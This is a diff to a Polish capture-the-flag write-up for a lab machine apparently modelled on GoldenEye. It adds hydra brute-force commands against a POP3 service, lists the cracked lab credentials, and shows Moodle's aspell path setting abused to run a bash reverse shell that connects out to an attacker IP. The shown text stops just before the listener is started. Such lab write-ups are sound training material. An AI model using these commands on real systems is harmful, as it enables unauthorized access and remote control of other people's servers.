@@ -113,7 +113,7 @@ hydra -l Boris -P /usr/share/set/src/fasttrack/wordlist.txt 10.10.63.124 -s 5500
 Boris:secret1!
 ```
 
-Wykorzystujemy znalezione hasło, aby zalogować się do serwisu telnet skonfigurowanego na porcie 55007:
+Wykorzystujemy znalezione hasło, aby zalogować się do serwisu POP3 skonfigurowanego na porcie 55007, za pomocą narzędzia telnet:
 
 ```
 telnet 10.10.63.124 55007
@@ -127,17 +127,21 @@ W serwisie znajdujemy wiadomości (emails). Dowiadujemy się z nich, że Natalya
 
 Kontynuujemy ataki za pomocą hydry, tym razem na użytkownika Natalya:
 
+```
+hydra -l Natalya -P /usr/share/set/src/fasttrack/wordlist.txt 10.10.63.124 -s 55007 pop3
+```
+
 ![Hydra2](img/Hydra2.JPG)
 
 ```
 Natalya:bird
 ```
 
-Wykorzystujemy znalezione hasło, aby zalogować się do serwisu telnet skonfigurowanego na porcie 55007:
+Ponownie logujemy się do serwisu POP3 za pomocą narzędzia telnet:
 
 ![Telnet2](img/Telnet2.JPG)
 
-Odczytujemy dostępne wiadomości, z których otrzymujemy dane do logowania użytkwonika Xenia oraz adres tajemniczej strony ('severnaya-station.com/gnocertdir/'):
+Odczytujemy dostępne wiadomości, z których otrzymujemy dane do logowania użytkwonika Xenia oraz adres tajemniczej strony (severnaya-station.com/gnocertdir/):
 
 ![RETR2](img/RETR2.JPG)
 
@@ -149,14 +153,94 @@ Dodajemy nowo poznaną stronę do pliku /etc/hosts:
 
 ![Su](img/Su.JPG)
 
-Logujemy się do serwisu za pomocą znalezionych danych do logowania:
+Po przejściu na stronę widzimy, że jest to strona startowa Moodle:
+
+![Moodle](img/Moodle.JPG)
+
+Logujemy się do serwisu Moodle za pomocą znalezionych danych do logowania:
 
 ```
 xenia:RCP90rulez!
 ```
 
-![Moodle](img/Moodle.JPG)
+![Moodle2](img/Moodle2.JPG)
 
+Po przejściu w zakładkę wiadomości poznajemy nową nazwę użytkownika - Doak:
 
+![Doak](img/Doak.JPG)
 
+Przeprowadzamy atak za pomocą hydry, tym razem na użytkownika Doak:
 
+```
+hydra -l Doak -P /usr/share/set/src/fasttrack/wordlist.txt 10.10.63.124 -s 55007 pop3
+```
+
+![Hydra3](img/Hydra3.JPG)
+
+```
+Doak:goat
+```
+
+Ponownie logujemy się do serwisu POP3 za pomocą narzędzia telnet:
+
+![Telnet3](img/Telnet3.JPG)
+
+Odczytujemy dostępną wiadomość, z której otrzymujemy dane do logowania użytkownika dr_doak:
+
+![RETR3](img/RETR3.JPG)
+
+```
+dr_doak:4England!
+```
+
+Logujemy się do serwisu Moodle:
+
+![Moodle3](img/Moodle3.JPG)
+
+W prywatnych plikach użytkownika dr_doak znajdujemy sekretną wiadomość skierowaną do James'a:
+
+![Secret](img/Secret.JPG)
+
+Pobieramy sekretną wiadomość:
+
+![Secret2](img/Secret2.JPG)
+
+```
+/dir007key/for-007.jpg
+```
+
+Przechodzimy do ukrytej lokalizacji:
+
+![007](img/007.JPG)
+
+Pobieramy zdjęcie i rozpoczynamy analizę za pomocą narzędzia exiftool:
+
+![Exiftool](img/Exiftool.JPG)
+
+```
+eFdpbnRlcjE5OTV4IQ==
+```
+
+W opisie zdjęcia widzimy zakodowaną wiadomość, którą dekodujemy przy użyciu [CyberChef'a](https://gchq.github.io/CyberChef/):
+
+![Winter](img/Winter.JPG)
+
+```
+xWinter1995x!
+```
+
+Znaleziony ciąg znaków jest prawdopodobnie hasłem użytkownika admin. Spróbujmy zalgoować się do serwisu Moodle za pomocą znalezionych danych:
+
+![Moodle4](img/Moodle4.JPG)
+
+Przechodzimy kolejno do: Settings -> Site administration -> Server -> System paths:
+
+![Paths](img/Paths.JPG)
+
+W miejsce "Path to aspell" wstawiamy reverse shell'a:
+
+```
+bash -i >& /dev/tcp/[IP]/[PORT] 0>&1
+```
+
+Po zapisaniu zmian odpalamy nasłuchiwanie na wybranym porcie:
